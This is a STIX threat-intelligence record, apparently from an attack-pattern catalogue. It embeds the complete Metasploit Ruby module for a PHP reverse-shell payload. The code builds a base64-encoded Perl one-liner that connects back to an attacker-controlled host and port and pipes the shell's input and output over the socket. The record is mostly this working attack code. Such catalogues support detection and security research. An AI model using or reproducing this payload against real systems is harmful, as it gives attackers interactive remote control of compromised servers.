{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8fe3ba91-455e-4c9a-bf06-09b015cd19d6",
    "created": "2024-08-14T16:33:19.286727Z",
    "modified": "2024-08-14T16:33:19.286731Z",
    "name": "PHP Command, Double Reverse TCP Connection (via Perl)",
    "description": "Creates an interactive shell via perl",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/php/reverse_perl.rb",
            "external_id": "reverse_perl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Php\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'PHP Command, Double Reverse TCP Connection (via Perl)',\n      'Description'   => 'Creates an interactive shell via perl',\n      'Author'        => 'cazz',\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'php',\n      'Arch'          => ARCH_PHP,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShell,\n      'PayloadType'   => 'cmd',\n      'Payload'       =>\n        {\n          'Offsets' => { },\n          'Payload' => ''\n        }\n      ))\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    buf = \"#{php_preamble}\"\n    buf += \"$c = base64_decode('#{Rex::Text.encode_base64(command_string)}');\"\n    buf += \"#{php_system_block({:cmd_varname=>\"$c\"})}\"\n    return super + buf\n\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    lhost = datastore['LHOST']\n    ver   = Rex::Socket.is_ipv6?(lhost) ? \"6\" : \"\"\n    lhost = \"[#{lhost}]\" if Rex::Socket.is_ipv6?(lhost)\n    cmd   = \"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\\\"#{lhost}:#{datastore['LPORT']}\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\"\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}